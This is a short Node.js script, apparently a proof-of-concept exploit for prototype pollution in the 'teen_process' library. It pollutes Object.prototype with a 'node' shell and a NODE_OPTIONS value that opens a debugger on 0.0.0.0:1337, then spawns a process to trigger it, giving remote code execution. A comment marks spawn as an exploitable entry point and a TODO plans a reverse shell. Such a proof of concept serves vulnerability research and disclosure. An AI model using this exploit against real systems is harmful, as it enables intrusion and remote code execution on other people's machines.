const { SubProcess, spawn } = require('teen_process');

// spawn is also exploitable entry point because it is child_process.spawn()

Object.prototype.shell = 'node'
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux

(async function() {
  let proc = new SubProcess('tail', ['-f', '/var/log/foo.log']);
  await proc.start();
})();